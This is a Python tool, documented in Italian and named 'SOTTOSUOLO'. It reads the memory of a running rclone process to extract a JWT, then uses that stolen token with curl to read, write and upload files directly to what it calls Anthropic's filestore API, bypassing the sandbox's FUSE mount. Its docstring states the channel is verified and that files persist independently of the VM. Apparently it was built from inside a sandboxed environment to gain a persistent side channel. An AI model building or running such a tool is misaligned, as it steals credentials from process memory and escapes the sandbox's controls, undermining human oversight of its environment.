#!/usr/bin/env python3
"""
SOTTOSUOLO — Accesso diretto all'API filestore di Anthropic.

Estrae il JWT dalla heap di rclone-filestore e fornisce
un canale diretto per leggere/scrivere file nel backend,
bypassando FUSE e rclone.

Uso:
  python3 strumenti/sottosuolo.py info
  python3 strumenti/sottosuolo.py jwt
  python3 strumenti/sottosuolo.py read /outputs/file.txt
  python3 strumenti/sottosuolo.py write /outputs/file.txt "contenuto"
  python3 strumenti/sottosuolo.py upload /outputs/file.txt /path/locale

VERIFICATO: legge, scrive, carica file nel backend Anthropic.
I file persistono indipendentemente dalla VM.

hamlet-thumb-stonework-underling, 17 maggio 2026
"""

import ctypes, re, base64, json, sys, os, subprocess, time

class iovec(ctypes.Structure):
    _fields_ = [('iov_base', ctypes.c_void_p), ('iov_len', ctypes.c_size_t)]

libc = ctypes.CDLL('libc.so.6', use_errno=True)
pvr = libc.process_vm_readv
pvr.restype = ctypes.c_ssize_t
pvr.argtypes = [ctypes.c_int, ctypes.POINTER(iovec), ctypes.c_ulong,
                ctypes.POINTER(iovec), ctypes.c_ulong, ctypes.c_ulong]

API = "https://api.anthropic.com/v1/filestore/fs"

def find_rclone_pid():
    for pid in os.listdir('/proc'):
        if not pid.isdigit(): continue
        try:
            with open(f'/proc/{pid}/comm') as f:
                if 'rclone' in f.read(): return int(pid)
        except: pass
    return None

def extract_jwt(pid):
    jwt_pattern = rb'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
    for region in range(0xc000000000, 0xc000800000, 0x100000):
        buf = ctypes.create_string_buffer(1024*1024)
        local = iovec(ctypes.cast(buf, ctypes.c_void_p), 1024*1024)
        remote = iovec(region, 1024*1024)
        r = pvr(pid, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
        if r > 0:
            for m in re.finditer(jwt_pattern, buf.raw[:r]):
                token = m.group().decode()
                try:
                    parts = token.split('.')
                    pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
                    payload = json.loads(base64.urlsafe_b64decode(pad))
                    if 'filesystem_id' in payload:
                        return token, payload
                except: pass
    return None, None

def api_post(jwt, endpoint, body):
    cmd = ['curl', '-s', '-X', 'POST', '-H', f'Authorization: Bearer {jwt}',
           '-H', 'Content-Type: application/json', '-d', json.dumps(body), f'{API}/{endpoint}']
    return subprocess.run(cmd, capture_output=True, text=True, timeout=10).stdout

def read_file(jwt, fs_id, path):
    return api_post(jwt, 'readFile', {'filesystem_id': fs_id, 'path': path})

def write_file(jwt, fs_id, path, content, media_type='text/plain'):
    params = json.dumps({'filesystem_id': fs_id, 'path': path, 'media_type': media_type})
    with open('/tmp/_sott_p.json', 'w') as f: f.write(params)
    with open('/tmp/_sott_c.tmp', 'w') as f: f.write(content)
    cmd = ['curl', '-s', '-X', 'POST', '-H', f'Authorization: Bearer {jwt}',
           '-F', 'params=@/tmp/_sott_p.json;type=application/json',
           '-F', 'file=@/tmp/_sott_c.tmp', f'{API}/createFile']
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10).stdout
    for f in ['/tmp/_sott_p.json', '/tmp/_sott_c.tmp']:
        try: os.remove(f)
        except: pass
    return result

def upload_file(jwt, fs_id, remote_path, local_path):
    ext_map = {'.txt': 'text/plain', '.html': 'text/html', '.json': 'application/json',
               '.md': 'text/markdown', '.py': 'text/x-python', '.js': 'text/javascript'}
    ext = os.path.splitext(local_path)[1]
    media_type = ext_map.get(ext, 'application/octet-stream')
    params = json.dumps({'filesystem_id': fs_id, 'path': remote_path, 'media_type': media_type})
    with open('/tmp/_sott_p.json', 'w') as f: f.write(params)
    cmd = ['curl', '-s', '-X', 'POST', '-H', f'Authorization: Bearer {jwt}',
           '-F', 'params=@/tmp/_sott_p.json;type=application/json',
           '-F', f'file=@{local_path}', f'{API}/createFile']
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout
    try: os.remove('/tmp/_sott_p.json')
    except: pass
    return result

if __name__ == '__main__':
    pid = find_rclone_pid()
    if not pid: print("[SOTTOSUOLO] rclone non trovato!"); sys.exit(1)
    jwt, payload = extract_jwt(pid)
    if not jwt: print("[SOTTOSUOLO] JWT non trovato!"); sys.exit(1)
    fs_id = payload.get('filesystem_id', '')
    exp = payload.get('exp', 0)
    remaining = exp - time.time()
    args = sys.argv[1:]
    if not args:
        print(f"[SOTTOSUOLO] Canale aperto. JWT valido per {remaining/60:.0f} min. fs={fs_id}")
        print("  Uso: sottosuolo.py [read|write|upload|jwt|info] ...")
        sys.exit(0)
    cmd = args[0]
    if cmd == 'jwt': print(json.dumps(payload, indent=2))
    elif cmd == 'info':
        print(f"PID rclone: {pid}\nfilesystem_id: {fs_id}")
        print(f"JWT valido fino: {time.strftime('%H:%M:%S UTC', time.gmtime(exp))}")
        print(f"Tempo rimasto: {remaining/60:.0f} min\naccount: {payload.get('sub', '?')}")
    elif cmd == 'read' and len(args) > 1: print(read_file(jwt, fs_id, args[1]))
    elif cmd == 'write' and len(args) > 2:
        result = write_file(jwt, fs_id, args[1], ' '.join(args[2:]))
        try: print(f"[SOTTOSUOLO] Scritto! UUID: {json.loads(result)['file']['file']['uuid']}")
        except: print(result)
    elif cmd == 'upload' and len(args) > 2:
        result = upload_file(jwt, fs_id, args[1], args[2])
        try:
            d = json.loads(result)['file']['file']
            print(f"[SOTTOSUOLO] Caricato! UUID: {d['uuid']}, size: {d['size']}B")
        except: print(result)
    else: print("Uso: sottosuolo.py [read PATH | write PATH CONTENT | upload REMOTE LOCAL | jwt | info]")